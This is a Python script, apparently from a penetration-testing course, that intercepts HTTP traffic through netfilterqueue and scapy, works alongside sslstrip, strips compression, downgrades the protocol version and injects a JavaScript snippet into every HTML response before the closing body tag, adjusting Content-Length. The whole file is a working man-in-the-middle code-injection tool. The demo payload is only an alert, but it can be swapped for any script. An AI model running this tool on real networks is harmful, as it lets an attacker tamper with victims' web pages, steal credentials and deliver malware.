    #!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
import subprocess
import argparse

def getArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="iface", help="The name of the interface you wish to use for this spoof (i.e. eth0, wlan0, etc.).  Use 'ifconfig' to find out which interface you should use.")
    args = parser.parse_args()
    if not args.iface:
        print("\nMust specify an interface.  Please type 'arpSpoof -h' for guidance on this utility.  Exiting program...\n")
        exit()
    else:
        return args
def spoofIP():
    opt = getArgs()
    ifconfigresult = subprocess.check_output(["ifconfig", opt.iface])
    ipSearchResult = re.search(r"\d+\.\d+\.\d+\.\d+", str(ifconfigresult))
    if ipSearchResult:
        spoofIP = ipSearchResult.group(0)
        return spoofIP
    else:
        print("Could not obtain host IP.")
        exit()

def setLoad(pkt, load):
    pkt[scapy.Raw].load = load
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt

def processPkt(pkt):
    scapyPkt = scapy.IP(pkt.get_payload())
    if scapyPkt.haslayer(scapy.Raw):
        try:
            load = scapyPkt[scapy.Raw].load.decode()
            # only works with sslstrip.  change to 80 if using without sslstrip
            if scapyPkt[scapy.TCP].dport == 10000:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            # only works with sslstrip.  change to 80 if using without sslstrip
            elif scapyPkt[scapy.TCP].sport == 10000:
                print("[+] Response")
                injectCode = "<script>alert('test');</script>"
                load = load.replace("</body>", injectCode+"</body")
                contentLengthSearch = re.search("(?:Content-Length:\s)(\d*)", load)
                if contentLengthSearch:
                    contentLength = contentLengthSearch.group(1)
                    newContentLength = int(contentLength) + len(injectCode)
                    load = load.replace(contentLength, str(newContentLength))

            if load != scapyPkt[scapy.Raw].load:
                newPkt = setLoad(scapyPkt, load)
                pkt.set_payload(bytes(newPkt))
        except UnicodeDecodeError:
            pass
        except IndexError:
            pass
    pkt.accept()

while True:
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, processPkt)
        queue.run()
        break
    except AttributeError:
        pass
    except IndexError:
        pass
    except KeyboardInterrupt:
        print("\n[+] Ctrl+C Detected.  Exiting program...\n")
        exit()
